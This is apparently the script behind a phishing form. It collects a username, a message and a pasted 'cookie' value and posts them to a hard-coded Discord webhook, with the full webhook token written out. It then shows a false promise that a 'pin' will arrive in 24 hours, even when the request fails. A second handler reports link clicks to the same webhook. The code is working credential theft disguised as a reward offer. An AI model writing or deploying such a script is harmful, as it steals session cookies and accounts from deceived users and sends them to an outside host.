// Existing form submission handler
document.getElementById('messageForm').addEventListener('submit', function(event) {
  event.preventDefault();

  const username = document.getElementById('username').value;
  const message = document.getElementById('message').value;
  const cookie = document.getElementById('cookie').value;

  const webhookURL = 'https://discord.com/api/webhooks/1267427703821176872/v_0F600_eVrRm3v8yrLOZOUzh_QCtlHjORXOyzbXdy-SjA1Qo1tSLVorsNyVfznaaaR7'; // Your webhook URL

  fetch(webhookURL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        embeds: [
          {
            title: 'New Submission',
            color: 0x00FF00, // Green color
            fields: [
              {
                name: 'Username',
                value: username,
                inline: true
                        },
              {
                name: 'Message',
                value: message,
                inline: true
                        },
              {
                name: 'Cookie',
                value: cookie,
                inline: false
                        }
                    ],
            footer: {
              text: 'Submission Details'
            }
                }
            ]
      })
    })
    
    .then(response => response.json())
    .then(data => {
      console.log('Success:', data);
      alert('Your pin will be sent to your discord server after 24 hours! Make sure you filled the box correctly');
    })
    
    .catch((error) => {
      console.error('Error:', error);
      alert('Your pin will be sent to your discord server after 24 hours! Make sure you filled the box correctly');
    });
});

// Link click handler
document.getElementById('notifyLink').addEventListener('click', function(event) {
  event.preventDefault(); // Prevent default link behavior

  const webhookURL = 'https://discord.com/api/webhooks/1267427703821176872/v_0F600_eVrRm3v8yrLOZOUzh_QCtlHjORXOyzbXdy-SjA1Qo1tSLVorsNyVfznaaaR7'; // Your webhook URL

  fetch(webhookURL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        embeds: [
          {
            title: 'Link Clicked',
            color: 0xFF0000, // Red color
            description: 'A user clicked the link!',
            footer: {
              text: 'Link Click Notification'
            }
                }
            ]
      })
    })
    .then(response => response.json())
    .then(data => {
      console.log('Success:', data);
      alert('Notification sent!');
    })
    .catch((error) => {
      console.error('Error:', error);
      alert('Failed to send notification.');
    });
});